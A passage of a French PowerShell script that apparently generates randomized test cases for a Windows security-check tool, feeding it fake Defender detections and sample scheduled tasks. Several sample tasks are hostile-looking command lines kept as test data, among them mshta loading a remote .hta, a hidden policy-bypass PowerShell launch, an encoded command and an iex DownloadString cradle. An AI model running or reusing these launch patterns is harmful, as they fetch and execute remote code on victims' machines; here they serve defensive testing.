    @{ Nom = 'Public'; Chemin = '\Truc\'; Exe = 'C:\Users\Public\a.exe'; Args = '' },
    @{ Nom = 'Mshta'; Chemin = '\'; Exe = 'mshta'; Args = 'http://exemple.com/x.hta' },
    @{ Nom = 'Cmd sans risque'; Chemin = '\'; Exe = 'cmd.exe'; Args = '/c echo bonjour' },
    @{ Nom = 'Mindset (installation)'; Chemin = '\Mindset\'; Exe = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; Args = '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\Introuvable\fichiers\installer-admin.ps1" -Action demande -Demande "C:\x\installation.demande"' },
    @{ Nom = 'Encodee'; Chemin = '\'; Exe = 'pwsh.exe'; Args = '-EncodedCommand AAAA' },
    @{ Nom = 'IEX'; Chemin = '\'; Exe = 'powershell'; Args = 'iex (New-Object Net.WebClient).DownloadString(1)' })
for ($i = 0; $i -lt 200; $i++) {
    $lecture = if ($rng.Next(5)) { [ordered]@{ ExclusionsNombre = (Get-Un @($null, -1, 0, 2, 5)); Menaces = @(Get-Quelques $Menaces 3)
        Detections = @(for ($k = $rng.Next(0, 4); $k -gt 0; $k--) { [ordered]@{ ThreatID = (Get-Un @('7', '9', '404')); ThreatStatusID = (Get-Un @(1, 3, 4)); Quand = (Get-Date '2026-05-01').AddMinutes($rng.Next(0, 200000)).Ticks; Resources = @(Get-Quelques @('file:_C:\a.exe', 'file:_D:\é.exe') 2) } }); DetectionsLues = [bool]$rng.Next(3) } } else { $null }
    $local = [ordered]@{ Exclusions = @(Get-Quelques $Exclus 2); ExclusionsNombre = 0; Threats = @(); Active = @(); Detections = @(); Tasks = @([ordered]@{ Name = 'Locale'; Path = '\'; Cmd = 'C:\Users\x\AppData\Local\Temp\l.exe'; Bad = $false }) }
    $entree = [ordered]@{ Local = $local; Lecture = $lecture; Taches = $(if ($rng.Next(5)) { @(Get-Quelques $tachesAide 6) } else { $null }) }
    $e = ($entree | ConvertTo-Json -Depth 20 -Compress) | ConvertFrom-Json
    $script:Cas = @{ AideSecurite = $e.Lecture; AideTaches = $e.Taches }
    $script:EstAdmin = $false
    $env:TEMP = 'C:\Users\x\AppData\Local\Temp'
    try {
        $d = @{ Exclusions = @($e.Local.Exclusions); ExclusionsNombre = 0; Threats = @(); Active = @(); Detections = @(); Tasks = @($e.Local.Tasks | ForEach-Object { @{ Name = $_.Name; Path = $_.Path; Cmd = $_.Cmd; Bad = $_.Bad } }) }
        Add-AideLectureSecurite $d
    } finally { $env:TEMP = $tempAvant }
    $sortieAide = [ordered]@{ ExclusionsNombre = [int]$d.ExclusionsNombre
        Threats = @($d.Threats | ForEach-Object { [ordered]@{ ThreatID = [string]$_.ThreatID; ThreatName = [string]$_.ThreatName; SeverityID = $_.SeverityID; IsActive = [bool]$_.IsActive } })
        Active = @($d.Active | ForEach-Object { [string]$_.ThreatID })
        Detections = @($d.Detections | ForEach-Object { [ordered]@{ ThreatID = [string]$_.ThreatID; ThreatStatusID = $_.ThreatStatusID; InitialDetectionTime = $_.InitialDetectionTime.ToString('yyyy-MM-ddTHH:mm:ss'); Resources = @($_.Resources) } })
        Tasks = @($d.Tasks | ForEach-Object { [ordered]@{ Name = [string]$_.Name; Path = [string]$_.Path; Cmd = [string]$_.Cmd; Bad = [bool]$_.Bad } }) }
    [void]$aide.Add([ordered]@{ nom = "aide-$i"; entree = $e; sortie = $sortieAide })
}
[IO.File]::WriteAllText((Join-Path $sortie 'aide.json'), (ConvertTo-Json @($aide) -Depth 30 -Compress), $utf8)
Write-Host "Juges écrits : $($juges.Count) cas de pages, $($aide.Count) cas de lecture de l'Aide ($sortie)" -ForegroundColor Green
